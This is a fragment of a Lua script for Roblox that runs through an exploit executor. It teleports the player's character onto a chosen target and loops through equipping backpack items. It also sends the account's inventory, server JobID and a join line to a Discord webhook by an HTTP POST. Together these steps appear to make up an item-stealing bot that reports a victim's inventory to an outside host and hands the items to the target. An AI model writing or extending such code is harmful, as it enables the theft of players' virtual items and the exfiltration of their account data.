-- üß† Utilities
local function getHRP(char)
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function flyToTarget(target)
    local myHRP = getHRP(LocalPlayer.Character)
    local targetHRP = getHRP(target.Character)
    if myHRP and targetHRP then
        myHRP.CFrame = targetHRP.CFrame + hoverOffset
    end
end

local function equipTool(tool)
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Character
    end
end

local function giveAllItems()
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        for _, item in ipairs(bp:GetChildren()) do
            if item:IsA("Tool") and table.find(giveItems, item.Name) then
                equipTool(item)
                wait(giveDelay)
            end
        end
    end
end

-- üîî Send Discord Webhook
local function sendWebhook()
    local jobId = game.JobId
    local inventoryList = {}
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        for _, item in ipairs(bp:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventoryList, item.Name)
            end
        end
    end

    local payload = {
        username = "Grow Bot üß™",
        embeds = {{
            title = "üéÅ Inventory Bot Ready",
            description = "**JobID:** `" .. jobId .. "`\n**Join Link:** `Roblox.GameLauncher.joinGameInstance(game.PlaceId, \"" .. jobId .. "\")`\n**Items:** ```" .. table.concat(inventoryList, ", ") .. "```",
            color = tonumber(0x00ff00)
        }}
    }

    local json = HttpService:JSONEncode(payload)
    syn.request({
        Url = webhook,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = json
    })
end

-- ‚úÖ Wait & Handle Target
local function onTargetJoin(target)
    print("[BOT] Target found: " .. target.Name)
    target.CharacterAdded:Connect(function()
        wait(2)
        while target.Parent and target.Character do
            flyToTarget(target)
            giveAllItems()
            wait(0.5)
        end
    end)
end

